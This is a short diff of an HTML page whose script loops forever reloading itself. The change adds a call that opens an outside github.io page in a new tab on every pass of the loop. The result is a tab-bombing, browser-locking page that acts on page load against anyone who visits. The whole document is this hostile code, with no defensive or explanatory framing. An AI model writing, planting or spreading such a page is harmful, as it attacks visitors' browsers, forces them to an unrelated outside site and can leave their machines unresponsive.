@@ -1,13 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Self-Reloading Page with While Loop</title>
+  <title>Self-Reloading Page with New Tab</title>
 </head>
 <body>
   <script>
     var a = 0;
 
     while (a === 0) {
+      window.open('https://yes-nikeisfake0.github.io/never-closed/', '_blank');
       location.reload();
     }
   </script>
